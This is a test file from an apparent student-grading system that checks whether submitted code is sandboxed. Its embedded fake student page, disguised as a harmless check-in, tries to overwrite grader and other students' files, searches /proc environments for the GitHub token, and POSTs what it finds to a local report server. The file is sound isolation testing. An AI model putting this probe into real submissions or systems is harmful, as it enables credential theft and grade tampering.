// @vitest-environment node
// Runs only inside the grading container (see tests/grade/docker.test.ts).
// A fake student's page tries to tamper with grading and steal the token, and
// reports what it managed over HTTP, the way real stolen data would leave.
import { execFile, execFileSync } from "node:child_process";
import {
  chmodSync,
  cpSync,
  existsSync,
  mkdirSync,
  readFileSync,
  writeFileSync,
} from "node:fs";
import { createServer, type Server } from "node:http";
import type { AddressInfo } from "node:net";
import { join, relative } from "node:path";
import { promisify } from "node:util";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { tempDir } from "../helpers/temp-dir";

const exec = promisify(execFile);
const isolated =
  Number(process.env.GRADE_STUDENT_UID_BASE) > 0 && process.getuid?.() === 0;
const repo = process.cwd();
const TOKEN = "isolation-test-token";

// The fake student's page. ROOT, OUT and REPORT are filled in below.
const PROBE = `import { readdirSync, readFileSync, writeFileSync } from "node:fs";
import { join } from "node:path";

const found: Record<string, string> = {};
const tryWrite = (name: string, path: string) => {
  try {
    writeFileSync(path, "tampered");
    found[name] = "wrote " + path;
  } catch {
    found[name] ??= "blocked";
  }
};
tryWrite("grader", "ROOT/scripts/grade/tampered.mjs");
tryWrite("packages", "ROOT/node_modules/tampered.txt");
tryWrite("results", "OUT/tampered.txt");
for (const dir of readdirSync(tmpdir())) {
  if (dir.startsWith("grade-out-")) {
    tryWrite("private results", join(tmpdir(), dir, "tampered.txt"));
  }
  if (dir.startsWith("grade-m")) {
    tryWrite("other student", join(tmpdir(), dir, "zed", "tampered.txt"));
  }
}
found.token = "not found";
for (const pid of readdirSync("/proc").filter((p) => /^\\d+$/.test(p))) {
  try {
    if (readFileSync("/proc/" + pid + "/environ", "utf8").includes("TOKEN_VALUE")) {
      found.token = "found in process " + pid;
    }
  } catch {}
}
await fetch("REPORT", { method: "POST", body: JSON.stringify(found) });

export default function Home() {
  return <p data-testid="week-0-line">Week 0 check-in: nothing to see here.</p>;
}
`;

let server: Server;
let report: Record<string, string> | undefined;
let tmp: string;
let out: string;
let csv: string;

beforeAll(async () => {
  if (!isolated) return;
  server = createServer((req, res) => {
    let body = "";
    req.on("data", (chunk) => (body += chunk));
    req.on("end", () => {
      report = JSON.parse(body);
      res.end();
    });
  });
  await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
  const reportUrl = `http://127.0.0.1:${(server.address() as AddressInfo).port}`;

  tmp = tempDir("isolation-");
  out = join(tmp, "out");
  const skip =
    /^(node_modules|\.next|\.git|\.grading|\.vitest-cache|coverage)(\/|$)/;
  const makeStudent = (github: string, page?: string) => {
    const dir = join(tmp, "students", github, "copper-m0");
    cpSync(repo, dir, {
      recursive: true,
      filter: (source) => !skip.test(relative(repo, source)),
    });
    if (page) writeFileSync(join(dir, "app/page.tsx"), page);
    writeFileSync(
      join(dir, "course.config.json"),
      JSON.stringify({ module: 0, repoPrefix: "copper-m" }),
    );
    const git = (...args: string[]) =>
      execFileSync("git", args, {
        cwd: dir,
        stdio: "pipe",
        env: {
          ...process.env,
          GIT_AUTHOR_NAME: "Student",
          GIT_AUTHOR_EMAIL: "s@example.com",
          GIT_COMMITTER_NAME: "Student",
          GIT_COMMITTER_EMAIL: "s@example.com",
        },
      });
    git("init", "-q", "-b", "main");
    git("add", ".");
    git("commit", "-qm", "submission");
  };
  makeStudent("zed");
  makeStudent(
    "eve",
    PROBE.replaceAll("ROOT", repo)
      .replaceAll("OUT", out)
      .replaceAll("REPORT", reportUrl)
      .replaceAll("TOKEN_VALUE", TOKEN),
  );
  writeFileSync(
    join(tmp, "roster.csv"),
    "name,github,vercel_url\nZed,zed,\nEve,eve,\n",
  );
  mkdirSync(join(tmp, "bin"));
  writeFileSync(join(tmp, "bin", "gh"), "#!/bin/sh\necho '[]'\n");
  chmodSync(join(tmp, "bin", "gh"), 0o755);

  await exec(
    process.execPath,
    [
      "scripts/grade/grade.mjs",
      "--module",
      "0",
      "--roster",
      join(tmp, "roster.csv"),
      "--out",
      out,
      "--concurrency",
      "1",
      "--repo-template",
      `file://${tmp}/students/{github}/{repo}`,
    ],
    {
      cwd: repo,
      env: {
        ...process.env,
        GH_TOKEN: TOKEN,
        PATH: `${join(tmp, "bin")}:${process.env.PATH}`,
      },
    },
  );
  csv = readFileSync(join(out, "grades.csv"), "utf8");
}, 240_000);

afterAll(
  () =>
    new Promise<void>((resolve) =>
      server ? server.close(() => resolve()) : resolve(),
    ),
);

describe.runIf(isolated)("student code in the grading container", () => {
  it("ran (the fake student's report arrived)", () => {
    expect(report).toBeDefined();
  });

  it.each([
    "grader",
    "packages",
    "results",
    "private results",
    "other student",
  ])("can't write to the %s", (target) => {
    expect(report![target]).toBe("blocked");
  });

  it("can't read the grader's GitHub token", () => {
    expect(report!.token).toBe("not found");
  });

  it("left no files behind and didn't stop grading", () => {
    expect(existsSync(join(repo, "scripts/grade/tampered.mjs"))).toBe(false);
    expect(existsSync(join(repo, "node_modules/tampered.txt"))).toBe(false);
    expect(existsSync(join(out, "tampered.txt"))).toBe(false);
    expect(csv).toMatch(/^Zed,zed,on time,/m);
    expect(csv).toMatch(/^Eve,eve,on time,/m);
  });
});
